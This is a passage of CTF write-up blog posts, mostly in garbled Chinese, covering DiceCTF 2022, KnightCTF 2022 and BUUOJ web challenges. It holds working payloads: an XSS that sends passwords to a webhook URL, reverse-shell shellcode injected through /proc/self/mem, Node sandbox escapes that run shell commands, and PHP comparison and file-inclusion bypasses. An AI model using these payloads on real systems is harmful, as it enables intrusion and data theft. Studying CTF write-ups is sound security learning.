id=y\u0026gt;hello\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; x.innerHTML = \u0026#39;\u0026lt;svg\u0026gt;\u0026lt;svg onload=alert(window.y.innerText)\u0026gt;\u0026#39; y.innerText = \u0026#39;updated\u0026#39; \u0026lt;/script\u0026gt; å®ƒalertçš„æ˜¯å‰é¢çš„hello\nè€Œæ¸²æŸ“é¡µé¢çš„jsä»£ç ç®€åŒ–åæ˜¯è¿™æ ·\n(async () =\u0026gt; { const { note, mode, views } = await (await fetch(\u0026#39;/view\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, }, body: JSON.stringify({ username, password, id: params.get(\u0026#39;id\u0026#39;) }) })).json(); document.querySelector(\u0026#39;.note\u0026#39;).innerHTML = text; // åœ¨åº•ä¸‹é€™è¡ŒåŸ·è¡Œä¹‹å‰ï¼Œæœƒå…ˆåŸ·è¡Œæˆ‘å€‘çš„ XSS payload document.querySelector(\u0026#39;.views\u0026#39;).innerText = views; })(); åˆ©ç”¨ä¸Šé¢\u0026lt;svg\u0026gt;æ’å…¥åå…ˆæ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨æœ€åä¸€è¡Œæ‰§è¡Œä¹‹å‰ï¼ŒdoSomeMagicï¼Œå°†document.querySelectorè¦†ç›–ï¼Œå†æŠŠJSON.stringifyè¦†ç›–ï¼Œåƒè¿™æ ·\ndocument.querySelector = function(){ JSON.stringify = function(date){ } } ä¹‹åå°±å¯ä»¥ç”¨ä¼ ç»Ÿè‰ºèƒ½arguments.callee.calleräº†ï¼Œå¯ä»¥å–åˆ°è°ƒç”¨JSON.stringifyçš„asyncå¹¶è°ƒç”¨ä¸€æ¬¡ï¼Œå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„å†…å®¹äº†\ndocument.querySelector = function(){ JSON.stringify = function(data){ console.log(data.password)\t// true payload here!!! } arguments.callee.caller() } å…¨payload\n\u0026lt;svg\u0026gt;\u0026lt;svg/onload=\u0026#34;document.querySelector=function(){JSON.stringify=a=\u0026gt;fetch(`https://webhook.site/11b32903-2d6a-4efc-b687-e06a0f0226aa?`+a.password),arguments.callee.caller()}\u0026#34;\u0026gt; web/vm-calc A simple and very secure online calculator!\ninstancer.mc.ax/vm-calc\ndist.tar\nå…ˆçœ‹package.jsonæ¶‰åŠåˆ°åŒ…çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œæœ€æ–°ç‰ˆæœ¬çš„vm2(3.9.5)ï¼Œæ— å…¬å¼€çš„é€ƒé€¸æ¼æ´ æ‰€ä»¥è‚¯å®šä¸æ˜¯æ²™ç›’é€ƒé€¸ï¼Œhbsç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶æ³„éœ²çš„æ´CVE-2021-32822\nç„¶åçœ‹index.jsï¼Œ.æˆ‘ä»¬éœ€è¦ç™»å…¥adminè´¦å·æ‹¿flagï¼Œè™½ç„¶ç»™å‡ºäº†æˆ‘ä»¬usernameå’Œpasswordï¼Œä½†æ˜¯æ˜¯sha256åçš„ç»“æœï¼Œæ²¡æ³•æ‘å¾—åˆ°æ˜æ–‡\nâ€”â€”â€”â€”çœ‹åˆ°wpåå‘ç°è‡ªå·±è¿˜æ˜¯æŸ¥çš„å°‘äº†ï¼Œä¸æ˜¯vm2æ²¡0dayï¼Œè€Œæ˜¯è¿™é‡Œç”¨çš„æ˜¯Nodejsçš„1dayï¼ŒCVE-2022-21824ï¼Œå‡ºé—®é¢˜çš„åœ°æ–¹æ˜¯map\nconsole.table([{x:1}], [\u0026#34;__proto__\u0026#34;]); å°±å¯ä»¥åšåˆ°åŸå‹æ±¡æŸ“\né¢˜ç›®ä¸­çš„filteræ£€æµ‹æ˜¯è¿™æ ·çš„\nif(users.filter(u =\u0026gt; u.user === user \u0026amp;\u0026amp; u.pass === hash)[0] !== undefined) { res.render(\u0026#34;admin\u0026#34;, { flag: await fsp.readFile(\u0026#34;flag.txt\u0026#34;) }); } æ‰€ä»¥åªè¦æ±¡æŸ“åŸå‹é“¾ï¼Œè®©[][0]ä¸ä¸ºç©ºï¼Œå°±å¯ä»¥é€šè¿‡adminçš„æ£€æµ‹\nweb/shadow I found a totally secure way to insert secrets into a webpage\nshadow.mc.ax | Admin Bot\né¡µé¢æºç å¯ä»¥çœ‹åˆ°js\n\u0026lt;script\u0026gt; // the admin has the flag set in localStorage[\u0026#34;secret\u0026#34;] let secret = localStorage.getItem(\u0026#34;secret\u0026#34;) ?? \u0026#34;dice{not_real_flag}\u0026#34; let shadow = window.vault.attachShadow({ mode: \u0026#34;closed\u0026#34; }); let div = document.createElement(\u0026#34;div\u0026#34;); div.innerHTML = ` \u0026lt;p\u0026gt;steal me :)\u0026lt;/p\u0026gt; \u0026lt;!-- secret: ${secret} --\u0026gt; `; let params = new URL(document.location).searchParams; let x = params.get(\u0026#34;x\u0026#34;); let y = params.get(\u0026#34;y\u0026#34;); div.style = y; shadow.appendChild(div); secret = null; localStorage.removeItem(\u0026#34;secret\u0026#34;); shadow = null; div = null; // free XSS window.xss.innerHTML = x; \u0026lt;/script\u0026gt; ä½¿ç”¨cloesdæ¨¡å¼çš„shadow DOMï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥å¤„ç†å®ƒçš„DOMç»“æ„\nä½†æ˜¯CSSæ ·å¼å¯æ§ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨ä¸€ä¸ªéæ ‡å‡†çš„CSSå±æ€§ï¼š-webkit-user-modifyï¼Œå®ƒä¸contenteditableç±»ä¼¼ï¼Œå¯ä»¥è°ƒç”¨document.execCommandæ¥æ’å…¥HTML\næ•´ä½“æ€è·¯ï¼šå…ˆç”¨ window.findå»focuså†…å®¹ä¹‹åï¼Œå†æ‰§è¡Œdocument.execCommandå»æ’å…¥ HTMLï¼Œç„¶åé€šè¿‡svgçš„eventå»æ‰§è¡ŒJSæ‹¿åˆ°èŠ‚ç‚¹\n/?y=-webkit-user-modify:+read-write\u0026amp;x=\u0026lt;img+src=x+onerror=\u0026#34;find(\u0026#39;steal me\u0026#39;);document.execCommand(\u0026#39;insertHTML\u0026#39;,false,\u0026#39;\u0026lt;svg/onload=alert(this.parentNode.innerHTML)\u0026gt;\u0026#39;)\u0026#34;\u0026gt; å¦‚æœæ²¡æœ‰focusä¼šå¤±è´¥ï¼›ç”¨imgè¿™æ ·çš„ä¼šè¯»ä¸åˆ°this.parentNodeï¼Œä½†æ˜¯å¦‚æœåœ¨å‰é¢åŠ ä¸Šdocument.exec('selectAll')ä¹Ÿæ˜¯å¯ä»¥çš„\n/?y=-webkit-user-modify:+read-write\u0026amp;x=\u0026lt;img+src=x+onerror=\u0026#34;find(\u0026#39;steal me\u0026#39;);document.execCommand(\u0026#39;selectAll\u0026#39;);document.execCommand(\u0026#39;insertHTML\u0026#39;,false,\u0026#39;\u0026lt;img/src=x+onerror=alert(this.parentNode.parentNode.innerHTML)\u0026gt;\u0026#39;)\u0026#34;\u0026gt; ***web/denoblog I love NodeJS and all, but I\u0026rsquo;ve heard that Deno is pretty cool\u0026hellip;\nI\u0026rsquo;m making my new blog on it! Even if there\u0026rsquo;s a vuln, Deno will protect me, right?\ninstancer.mc.ax/denoblog\ndist.tar\né¡µé¢ä¸Šåªæœ‰åˆ‡æ¢æ˜¾ç¤ºè¯­è¨€çš„åŠŸèƒ½ï¼Œå…¶å®ƒä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œçœ‹ä¸€ä¸‹app.ts\nimport { serve } from \u0026#34;https://deno.land/std/http/server.ts\u0026#34;; import * as cookie from \u0026#34;https://deno.land/std/http/cookie.ts\u0026#34;; import * as dejs from \u0026#34;https://deno.land/x/dejs/mod.ts\u0026#34;; const port = 8080; const handler = async (req: Request): Promise\u0026lt;Response\u0026gt; =\u0026gt; { let lang = cookie.getCookies(req.headers)[\u0026#34;lang\u0026#34;] ?? \u0026#34;en\u0026#34;; let body = await dejs.renderFileToString(\u0026#34;./views/index.ejs\u0026#34;, { lang }); let headers = new Headers(); headers.set(\u0026#34;content-type\u0026#34;, \u0026#34;text/html\u0026#34;); return new Response(body, { headers, status: 200 }); }; console.log(\u0026#34;[app] server now listening for connections...\u0026#34;); await serve(handler, { port }); å®ƒä½¿ç”¨cookieè®°å½•è¯­è¨€æ˜¯enè¿˜æ˜¯esï¼Œé»˜è®¤enï¼Œä¹‹åæ¸²æŸ“./views/index.ejsä¸ºå¯¹åº”çš„è¯­è¨€\n\u0026lt;% await include(`./langs/${lang}`); %\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;denoblog\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://unpkg.com/@picocss/pico@latest/css/pico.classless.min.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;main\u0026gt; \u0026lt;hgroup\u0026gt; \u0026lt;h1\u0026gt;denoblog\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;\u0026lt;%= i18n.HEADER %\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;/hgroup\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;%= i18n.SWITCH_LANG %\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;javascript:document.cookie = \u0026#39;lang=en\u0026#39;; location.reload();\u0026#34;\u0026gt;English\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;javascript:document.cookie = \u0026#39;lang=es\u0026#39;; location.reload();\u0026#34;\u0026gt;EspaÃ±ol\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;hr /\u0026gt; \u0026lt;%= i18n.COMING_SOON %\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æ³¨æ„åˆ°å®ƒç”¨äº†includeï¼Œå¦‚æœè®©å®ƒåŒ…å«å…¶å®ƒçš„ï¼Œå°±å¯ä»¥LFIäº†\n# çˆ†ç ´pid import requests HOST = \u0026#34;https://denoblog-26b8ed381fd6c5f9.mc.ax\u0026#34; while True: for num in range(8, 15): for num2 in range(9,13): print(f\u0026#34;attempting: ../../../../../../../../proc/{num}/fd/{num2}\u0026#34;) try: r = requests.get(HOST, cookies={\u0026#34;lang\u0026#34;: f\u0026#34;../../../../../../../../proc/{num}/fd/{num2}\u0026#34;}) except: pass ä½†æ˜¯å¦‚ä½•rceå‘¢ï¼Ÿä¸€è½¬pwnåŠ¿\nåœ¨dockerfileä¸­æœ‰è¿™æ ·çš„æƒé™è®¾ç½®\nRUN deno compile --allow-read --allow-write --allow-net app.ts RUN chmod 755 /app/app å†™å…¥/proc/self/memï¼Œè¦†ç›–å†…å­˜ï¼Œè°ƒç”¨JSON.stringifyæ¥è§¦å‘ä»£ç \nNow, where to write is the question. I ran deno with gdb, and printed the address of Builtins_JsonStringify. This address was at a constant offset each time, so I just clobbered this region in memory with my own shellcode, then ran JSON.stringify() to trigger my code.\n(gdb) p Builtins_JsonStringify $4 = {\u0026lt;text variable, no debug info\u0026gt;} 0x281d340 \u0026lt;Builtins_JsonStringify\u0026gt; So, I created my shellcode, and injected into the deno process at the right section, then ran JSON.stringify() all through an ejs template included with a file descriptor. Doing all of this gets you the flag!\npayload\nimport requests import base64 HOST = \u0026#34;https://denoblog-26b8ed381fd6c5f9.mc.ax\u0026#34; IPADDR = \u0026#34;1.1.1.1\u0026#34; PORT = 12345 addr_hex = bytes.fromhex(\u0026#39;\u0026#39;.join([hex(int(n))[2:].zfill(2) for n in IPADDR.split(\u0026#34;.\u0026#34;)])) port_hex = bytes.fromhex(hex(PORT)[2:]) shellcode = \\ b\u0026#34;\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\u0026#34; + \\ b\u0026#34;\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\u0026#34; + \\ b\u0026#34;\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\u0026#34; + \\ b\u0026#34;\\x02\u0026#34; + port_hex + b\u0026#34;\\xc7\\x44\\x24\\x04\u0026#34; + addr_hex + b\u0026#34;\\x48\\x89\\xe6\\x6a\\x10\u0026#34; + \\ b\u0026#34;\\x5a\\x41\\x50\\x5f\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\u0026#34; + \\ b\u0026#34;\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\u0026#34; + \\ b\u0026#34;\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\u0026#34; + \\ b\u0026#34;\\x5f\\x6a\\x3b\\x58\\x0f\\x05\u0026#34; payload = \u0026#34;\u0026#34;\u0026#34; \u0026lt;% let maps = await Deno.readTextFile(\u0026#39;/proc/self/maps\u0026#39;); let line = maps.split(\u0026#34;\\\\n\u0026#34;).find(l =\u0026gt; l.includes(\u0026#34;/app/app\u0026#34;) \u0026amp;\u0026amp; l.includes(\u0026#34;r-x\u0026#34;)); let base = parseInt(line.split(\u0026#34; \u0026#34;)[0].split(\u0026#34;-\u0026#34;)[0], 16); let mem = await Deno.open(\u0026#39;/proc/self/mem\u0026#39;, { write: true }); let offset = base + 0xd39340; console.log(\u0026#34;[pwn] Builtins_JsonStringify @ 0x\u0026#34; + (offset).toString(16)); await Deno.seek(mem.rid, offset, Deno.SeekMode.Start); let shellcode = `\u0026#34;\u0026#34;\u0026#34; + base64.b64encode(shellcode).decode() + \u0026#34;\u0026#34;\u0026#34;`; shellcode = atob(shellcode); shellcode = \u0026#34;\\\\x90\u0026#34;.repeat(512) + shellcode; let shellcode_arr = new Uint8Array(shellcode.length); for(let i = 0; i \u0026lt; shellcode.length; i++) { shellcode_arr[i] = shellcode.charCodeAt(i); } console.log(\u0026#34;[pwn] lets go~\u0026#34;); await Deno.write(mem.rid, shellcode_arr); JSON.stringify(\u0026#34;wtmoo\u0026#34;); %\u0026gt; \u0026#34;\u0026#34;\u0026#34; payload += \u0026#34;A\u0026#34;*1024*64 print(f\u0026#34;sending rev shell to {IPADDR}:{PORT}...\u0026#34;) while True: r = requests.get(HOST, data=payload) è¿˜èƒ½è¯´ä»€ä¹ˆå‘¢ ç‰›é€¼\nâ€”â€”â€”â€”ä»¥ä¸Šåé¢pwnçš„åœ°æ–¹æˆ‘ç›´æ¥å¤åˆ¶çš„å®˜æ–¹wp\nmisc/undefined I was writing some Javascript when everything became undefined\u0026hellip;\nCan you create something out of nothing and read the flag at /flag.txt? Tested for Node version 17.\nnc mc.ax 31131\nindex.js\né¢ï¼Œå‡ ä¹æŠŠjsæ‰€æœ‰ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿éƒ½æ•´æˆundefinedäº†\nä½†æ˜¯importè¿˜å¯ä»¥åŠ¨æ€å¼•å…¥ï¼ˆä½œè€…å¿½ç•¥äº†\nimport(\u0026#39;fs\u0026#39;).then(fs=\u0026gt;fs.readFile(\u0026#39;/flag.txt\u0026#39;,\u0026#39;utf-8\u0026#39;,(err,data)=\u0026gt;{console.log(data,err)})); é¢„æœŸåˆ™æ˜¯è¿™æ ·\n(function(){return arguments.callee.caller.arguments[1](\u0026#34;fs\u0026#34;).readFileSync(\u0026#34;/flag.txt\u0026#34;,\u0026#34;utf-8\u0026#34;)})() éšä¾¿ä¸€ä¸ªå‡½æ•°ï¼Œarguments.calleeå¾—åˆ°å½“å‰æ‰§è¡Œçš„å‡½æ•°ï¼Œarguments.callee.callerå¾—åˆ°è°ƒç”¨å®ƒçš„å‡½æ•°ï¼Œå†é€šè¿‡arguments[1]è·å¾—åˆ°requireè¿™ä¸ªå‚æ•°ï¼Œæ‰§è¡Œrequire(\u0026quot;fs\u0026quot;)ä»¥åŠåç»­æ“ä½œ\nâ€”â€”â€”â€”è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ–¹æ³•2ï¼š\nåˆ©ç”¨Nodeå¯ä»¥æ‹¿åˆ°structured Stack Traceçš„feature\nfunction CustomError() { const oldStackTrace = Error.prepareStackTrace try { Error.prepareStackTrace = (err, structuredStackTrace) =\u0026gt; structuredStackTrace Error.captureStackTrace(this) this.stack } finally { Error.prepareStackTrace = oldStackTrace } } function trigger() { const err = new CustomError() for (const x of err.stack) { console.log(x.getFunction()+\u0026#34;\u0026#34;) } } trigger() æˆ‘ä»¬å¯ä»¥ç”¨x.getFunction()æ‹¿åˆ°ä¸Šå±‚çš„functionï¼Œå°±æ˜¯Nodeåœ¨æ‰§è¡Œæ—¶åŠ ä¸Šçš„wrapperï¼Œå†é€šè¿‡argumentså¾—åˆ°fn.arguments[1]ï¼ˆä¹Ÿå°±æ˜¯require\næ”¾åˆ°é¢˜ç›®ä¸­ç”±äºæ²¡æœ‰Errorå¯ä»¥ç”¨ï¼Œæˆ‘ä»¬ç›´æ¥è‡ªåˆ¶ä¸€ä¸ªTypeError\ntry { null.f() } catch (e) { TypeError = e.constructor } Error = TypeError.prototype.__proto__.constructor å†åˆ©ç”¨TypeErroræ˜¯ç»§æ‰¿è‡ªErrorçš„ç‰¹æ€§ï¼Œå°±å¯ä»¥ä¸ä¾é globalæ‹¿åˆ°Error constructoräº†\nå…¨payload\ntry { null.f() } catch (e) { TypeError = e.constructor } Object = {}.constructor String = \u0026#39;\u0026#39;.constructor Error = TypeError.prototype.__proto__.constructor function CustomError() { const oldStackTrace = Error.prepareStackTrace try { Error.prepareStackTrace = (err, structuredStackTrace) =\u0026gt; structuredStackTrace Error.captureStackTrace(this) this.stack } finally { Error.prepareStackTrace = oldStackTrace } } function trigger() { const err = new CustomError() console.log(err.stack[0]) for (const x of err.stack) { const fn = x.getFunction() console.log(String(fn).slice(0, 200)) console.log(fn?.arguments) console.log(\u0026#39;=\u0026#39;.repeat(40)) if ((args = fn?.arguments)?.length \u0026gt; 0) { req = args[1] console.log(req(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;id\u0026#39;).toString()) } } } trigger() // dice{who_needs_builtins_when_you_have_arguments} äººåœ¨å®¶ä¸­åï¼Œå¼€å­¦å»¶æœŸå¤©ä¸Šæ¥\nä¸èƒ½ç»§ç»­æ‘†äº†ï¼Œæˆ‘ä»–å¦ˆå­¦çˆ†ï¼ï¼ï¼ï¼ï¼ï¼\n","date":"2022-02-17T00:00:24+08:00","permalink":"https://amiaaaz.github.io/2022/02/17/dicectf2022-wp/","section":"posts","tags":["wp"],"title":"diceCTF2022 Wp"},{"categories":["CTF"],"contents":"https://knightctf.com/challenges\nhttps://ctftime.org/event/1545/tasks/\næ ‡-çš„ä¸¤é“é¢˜æ˜¯è„‘å­çŸ­è·¯äº†ï¼Œèµ›åå‡ºçš„\nSometime you need to look wayback https://github.com/KCTF202x/repo101/commits/main\nKCTF{version_control_is_awesome}\nDo Something Special http://do-something-special.kshackzone.com/\né¡µé¢æŒ‰é’®é‡å®šå‘è‡³/gr@b_y#ur_fl@g_h3r3!ï¼Œç”±äºurlçš„æˆªæ–­ï¼Œ#å’Œåé¢çš„å†…å®¹æˆ‘ä»¬urlencodeä¸€ä¸‹\nKCTF{Sp3cial_characters_need_t0_get_Url_enc0ded}\nObsfuscation Isn\u0026rsquo;t Enough å¾ˆé•¿çš„jsfuckï¼Œæ§åˆ¶å°\nif (document.forms[0].username.value == \u0026#34;83fe2a837a4d4eec61bd47368d86afd6\u0026#34; \u0026amp;\u0026amp; document.forms[0].password.value == \u0026#34;a3fa67479e47116a4d6439120400b057\u0026#34;) document.location = \u0026#34;150484514b6eeb1d99da836d95f6671d.php\u0026#34; http://obsfication.kshackzone.com/150484514b6eeb1d99da836d95f6671d.php\nKCTF{0bfuscat3d_J4v4Scr1pt_aka_JSFuck}\n-Zero is not the limit æœ‰user1åˆ°user5ï¼Œæ²¡æœ‰user0\nç„¶åæ²¡è§£å‡ºæ¥ï¼Œçœ‹wpå°±æœ‰ç‚¹æ— è¯­\n/user/-1 â€¦â€¦\nFind Pass Code - 1 é¡µé¢æç¤º/?source=1å¯çœ‹æºç \n\u0026lt;?php require \u0026#34;flag.php\u0026#34;; if (isset($_POST[\u0026#34;pass_code\u0026#34;])) { if (strcmp($_POST[\u0026#34;pass_code\u0026#34;], $flag) == 0 ) { echo \u0026#34;KCTF Flag : {$flag}\u0026#34;; } else { echo \u0026#34;Oh....My....God. You entered the wrong pass code.\u0026lt;br\u0026gt;\u0026#34;; } } if (isset($_GET[\u0026#34;source\u0026#34;])) { print show_source(__FILE__); } ?\u0026gt; ç”¨äº†strcmpï¼Œæˆ‘ä»¬ç›´æ¥æ•°ç»„ç»•è¿‡\npass_code=KCTF KCTF{ShOuLd_We_UsE_sTrCmP_lIkE_tHaT}\nMost Secure Calculator readfile(\u0026#39;flag.txt\u0026#39;); KCTF{WaS_mY_cAlCuLaToR_sAfE}\nCan you be Admin? å…¸ï¼Œè¯·æ±‚å¤´çš„é¢˜\nUser-Agent: KnightSquad Referer: localhost POST: username=tareq\u0026amp;password=IamKnight\u0026amp;submit=Login /dashboard.php User-Agent: KnightSquad Referer: localhost Cookie: VXNlcl9UeXBl=QWRtaW4= æ›´å…¸çš„æ˜¯æ€»æœ‰æ¨¡ç³Šä¸æ¸…çš„æç¤º\nKCTF{FiN4LlY_y0u_ar3_4dm1N}\nMy PHP Site /?file=æ–‡ä»¶åŒ…å«ç‚¹ï¼Œphpä¼ªåè®®çœ‹é¡µé¢æºç \n\u0026lt;?php if(isset($_GET[\u0026#39;file\u0026#39;])){ if ($_GET[\u0026#39;file\u0026#39;] == \u0026#34;index.php\u0026#34;) { echo \u0026#34;\u0026lt;h1\u0026gt;ERROR!!\u0026lt;/h1\u0026gt;\u0026#34;; die(); }else{ include $_GET[\u0026#39;file\u0026#39;]; } }else{ echo \u0026#34;\u0026lt;h1\u0026gt;You are missing the file parameter\u0026lt;/h1\u0026gt;\u0026#34;; #note :- secret location /home/tareq/s3crEt_fl49.txt } ?\u0026gt; ç›´æ¥åŒ…å«s3crEt_fl49.txtå°±è¡Œï¼Œä¸ç”¨ç»å¯¹è·¯å¾„\nKCTF{L0C4L_F1L3_1ncLu710n}\n-Bypass!! Bypass!! Bypass!! é¡µé¢æºç æç¤º/api/request/auth_tokenï¼Œpostï¼Œå¾—åˆ°token=nrpd935q5g77b0kr7iaiwi0aesa7m79xqu4n99hiï¼Œç„¶åæˆ‘å°è¯•äº†å¾ˆå¤šget postå‚æ•°ï¼Œè¿˜æœ‰cookieï¼Œéƒ½ä¸è¡Œ\nçœ‹wpæ‰çŸ¥é“è¿™é‡Œåº”è¯¥ä½¿ç”¨X-Authorized-Forè¯·æ±‚å¤´\nKCTF{cOngRatUlaT10Ns_wElCoMe_t0_y0ur_daShBoaRd}\nFind Pass Code - 2 è·Ÿä¹‹å‰ä¸€æ ·çš„æ–¹å¼çœ‹æºç /?source=1\n\u0026lt;?php require \u0026#34;flag.php\u0026#34;; $old_pass_codes = array(\u0026#34;0e215962017\u0026#34;, \u0026#34;0e730083352\u0026#34;, \u0026#34;0e807097110\u0026#34;, \u0026#34;0e840922711\u0026#34;); $old_pass_flag = false; if (isset($_POST[\u0026#34;pass_code\u0026#34;]) \u0026amp;\u0026amp; !is_array($_POST[\u0026#34;pass_code\u0026#34;])) { foreach ($old_pass_codes as $old_pass_code) { if ($_POST[\u0026#34;pass_code\u0026#34;] === $old_pass_code) { $old_pass_flag = true; break; } } if ($old_pass_flag) { echo \u0026#34;Sorry ! It\u0026#39;s an old pass code.\u0026#34;; } else if ($_POST[\u0026#34;pass_code\u0026#34;] == md5($_POST[\u0026#34;pass_code\u0026#34;])) { echo \u0026#34;KCTF Flag : {$flag}\u0026#34;; } else { echo \u0026#34;Oh....My....God. You entered the wrong pass code.\u0026lt;br\u0026gt;\u0026#34;; } } if (isset($_GET[\u0026#34;source\u0026#34;])) { print show_source(__FILE__); } ?\u0026gt; å…¸ï¼Œ0eç»•è¿‡ï¼Œ0e1137126905\nKCTF{ShOuD_wE_cOmPaRe_MD5_LiKe_ThAt__Be_SmArT}\nMost Secure Calculator - 2 8è¿›åˆ¶ï¼Œä¾æ—§æ˜¯readfile('flag.txt')\n(\u0026#34;\\162\\145\\141\\144\\146\\151\\154\\145\u0026#34;)(\u0026#34;\\146\\154\\141\\147\\56\\164\\170\\164\u0026#34;) discordä¸Šè¿˜çœ‹åˆ°å¾ˆå¤šxorçš„payloadï¼Œä¹Ÿå¾ˆå¥½\n(\u0026#34;538869\u0026#34;^\u0026#34;~4~2-~\u0026#34;^\u0026#34;8~5~~*\u0026#34;)((\u0026#34;378#\u0026#34;^\u0026#34;~(2,\u0026#34;^\u0026#34;.~~%\u0026#34;)) (\u0026#34;393480\u0026#34;^\u0026#34;@@@@]]\u0026#34;)((\u0026#34;8!4@80!8\u0026#34;^\u0026#34;[@@`^@_\u0026#34;).(\u0026#34;.\u0026#34;).(\u0026#34;484\u0026#34;^\u0026#34;@@@\u0026#34;)) ","date":"2022-01-24T17:47:53+08:00","permalink":"https://amiaaaz.github.io/2022/01/24/knightctf2022-wp/","section":"posts","tags":["wp"],"title":"KnightCTF2022 Wp"},{"categories":["LTS","CTF"],"contents":"å› ä¸ºå‰é¢åšçš„å¾ˆå¤šç”±äºæ—¶é—´å…³ç³»é—å¿˜äº†ä¸å°‘ï¼Œè¶ç€å¯’å‡æ¥æ¸©æ•…çŸ¥æ–°åˆ·æ³¢é¢˜ï¼Œè¿™é‡Œå°±åšä¸ªbuuoj-webéƒ¨åˆ†åˆ·é¢˜çš„å­˜æ¡£ï¼Œåº”è¯¥éƒ½æ¯”è¾ƒè¯¦ç»†\næ‰“æ˜Ÿå·çš„å¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒé—®é¢˜å¤ç°ä¸äº†ï¼Œæˆ–è€…è‡ªå·±æœ‰åœ°æ–¹æ²¡ææ‡‚\nâ€”â€”â€”â€”å‰æ’é£Ÿç”¨æ³¨æ„ï¼šå¯å±•å¼€çš„éƒ¨åˆ†ä¸­æ˜¯æ²¡æœ‰å¾ˆå¥½çš„mdæ’ç‰ˆçš„ï¼ˆä¸åšäºŒçº§æ ‡é¢˜æ˜¯ä¸æƒ³å·¦ä¾§tocå’Œæ•´ä½“é¡µé¢å¤ªè‡ƒè‚¿Orz.\npage 01 [æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL | sqli å¼±å£ä»¤ å¼±å£ä»¤ç™»å…¥\nadmin'or 1#: 12345\n[HCTF 2018]WarmUp | mb_substr æŸ¥çœ‹é¡µé¢æºç æç¤ºsource.php\n\u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) { echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;]) ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34; /\u0026gt;\u0026#34;; } ?\u0026gt; mb_substrä¸substrç”¨æ³•ä¸€æ ·\næ‰€ä»¥æˆ‘ä»¬åœ¨å‚æ•°å†…å¤šåŠ ä¸€ä¸ª?å³å¯ï¼Œä½†æ˜¯è¦æ³¨æ„urlencodeï¼Œä»£ç ä¸­æœ‰ä¸€æ¬¡decodeï¼Œæœ¬èº«è¿˜æœ‰ä¸€æ¬¡decodeï¼Œæ‰€ä»¥è¦encodeä¸¤æ¬¡\npayload\n/source.php?file=hint.php%253F../../../../../ffffllllaaaagggg å‚è€ƒï¼šphpmyadmin4.8.1åå°getshell\nåŒæ ·çš„æ–¹å¼ç»•è¿‡wafç™»å…¥æ•°æ®åº“ï¼Œåˆ›å»ºåä¸ºä¸€å¥è¯shellçš„è¡¨ï¼ŒåŒ…å«å¯¹åº”è·¯å¾„çš„æ•°æ®åº“æ–‡ä»¶å¾—åˆ°shell\n[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun é¡µé¢æºç \n$cat=$_GET[\u0026#39;cat\u0026#39;]; echo $cat; if($cat==\u0026#39;dog\u0026#39;){ echo 